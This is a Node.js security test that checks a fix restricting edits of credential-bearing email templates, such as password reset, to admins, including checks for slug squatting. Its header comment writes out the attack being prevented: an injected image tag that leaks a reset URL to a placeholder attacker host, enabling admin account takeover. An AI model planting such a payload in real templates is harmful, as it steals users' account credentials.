// =============================================================================
// SR-01 — templates that carry account credentials are admin-only to edit.
//
// The password-reset email became an editable system template. Template bodies
// are editor-controlled HTML with merge values inserted verbatim, so a user
// holding only `comms.templates.manage` (grantable to non-admin roles) could
// add <img src="https://attacker/?t={{reset.url}}">, trigger the public
// POST /api/auth/forgot-password for an admin's email, and take the account.
// services/credentialTemplates.js restricts writes to those templates to
// admins and reserves their slugs; routes/templates.js applies it.
//
// This test needs no server and no database. It covers the decision logic,
// including slugs that MySQL's utf8mb4_unicode_ci / PAD SPACE collation treats
// as equal ('Password_Reset ', 'pässword_reset'). It also scans the seeded
// system templates, so a future template carrying a credential merge field
// fails here until it is added to CREDENTIAL_TEMPLATE_SLUGS.
//
// Run:  node server/tests/security/SR-01.credential-template-lock.test.js
// =============================================================================
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const Module = require('module');

const {
  CREDENTIAL_TEMPLATE_SLUGS,
  isReservedTemplateSlug,
  credentialTemplateWriteError,
} = require('../../src/services/credentialTemplates');

const admin  = { id: 1, roles: ['admin'],  permissions: [] };
const editor = { id: 9, roles: ['comms'],  permissions: ['comms.templates.manage'] };
const noRoles = { id: 10 };

let passed = 0;
function test(name, fn) {
  try { fn(); passed++; console.log(`  ok   ${name}`); }
  catch (err) { console.error(`  FAIL ${name}\n       ${err.message}`); process.exitCode = 1; }
}

console.log('SR-01 credential template lock');

// ── The attack path from the review ─────────────────────────────────────────
test('non-admin editor cannot edit a credential template', () => {
  const r = credentialTemplateWriteError({ user: editor, action: 'update', targetIsCredential: true });
  assert.strictEqual(r?.status, 403);
});

test('non-admin editor cannot delete a credential template', () => {
  const r = credentialTemplateWriteError({ user: editor, action: 'delete', targetIsCredential: true });
  assert.strictEqual(r?.status, 403);
});

test('a user with no roles is treated as non-admin', () => {
  const r = credentialTemplateWriteError({ user: noRoles, action: 'update', targetIsCredential: true });
  assert.strictEqual(r?.status, 403);
});

// ── No regression for legitimate use ───────────────────────────────────────
test('admin can still edit a credential template', () => {
  assert.strictEqual(credentialTemplateWriteError({ user: admin, action: 'update', targetIsCredential: true }), null);
});

test('non-admin editor can still edit ordinary templates', () => {
  assert.strictEqual(
    credentialTemplateWriteError({ user: editor, action: 'update', targetIsCredential: false, requestedSlug: 'newsletter' }),
    null
  );
});

test('non-admin editor can still create ordinary templates', () => {
  assert.strictEqual(credentialTemplateWriteError({ user: editor, action: 'create', requestedSlug: 'spring-appeal' }), null);
  assert.strictEqual(credentialTemplateWriteError({ user: editor, action: 'create', requestedSlug: null }), null);
});

// ── Slug squatting: creating or renaming onto a protected slug ─────────────
test('creating a template with a credential slug is refused, even for admins', () => {
  for (const user of [editor, admin]) {
    const r = credentialTemplateWriteError({ user, action: 'create', requestedSlug: 'password_reset' });
    assert.strictEqual(r?.status, 422, `expected 422 for ${user.roles}`);
  }
});

test('renaming an ordinary template onto a credential slug is refused', () => {
  const r = credentialTemplateWriteError({
    user: editor, action: 'update', targetIsCredential: false, requestedSlug: 'user_account_created',
  });
  assert.strictEqual(r?.status, 422);
});

test('collation-equivalent slugs are treated as reserved', () => {
  for (const slug of ['PASSWORD_RESET', 'Password_Reset ', '  password_reset', 'pässword_reset', 'passwörd_reset']) {
    assert.ok(isReservedTemplateSlug(slug), `"${slug}" should be reserved`);
  }
  assert.ok(!isReservedTemplateSlug('password_resets'), 'a different slug must not be reserved');
  assert.ok(!isReservedTemplateSlug(''), 'an empty slug must not be reserved');
});

// ── Tripwire: every seeded template carrying a credential must be locked ───
test('every seeded template with a credential merge field is protected', () => {
  const seederPath = path.join(__dirname, '../../src/services/templateSeeder.js');
  const mod = new Module(seederPath, module);
  mod.filename = seederPath;
  mod.paths = Module._nodeModulePaths(path.dirname(seederPath));
  mod._compile(`${fs.readFileSync(seederPath, 'utf8')}\nmodule.exports.__TEMPLATES = TEMPLATES;`, seederPath);

  const CREDENTIAL_FIELDS = /\{\{\s*(reset\.url|invite\.accept_url|portal\.temp_password|portal\.verify_url)\s*\}\}/;
  const carrying = mod.exports.__TEMPLATES
    .filter((t) => CREDENTIAL_FIELDS.test(`${t.subject || ''}${t.body || ''}`))
    .map((t) => t.slug);

  assert.ok(carrying.includes('password_reset'), 'password_reset should be detected as credential-bearing');
  const unprotected = carrying.filter((slug) => !CREDENTIAL_TEMPLATE_SLUGS.includes(slug));
  assert.deepStrictEqual(unprotected, [], `add these to CREDENTIAL_TEMPLATE_SLUGS: ${unprotected.join(', ')}`);
});

console.log(`\n${passed} passed${process.exitCode ? ', with failures' : ''}`);
// The seeder module opens a (lazy, never-used) DB pool; don't wait on it.
process.exit(process.exitCode || 0);
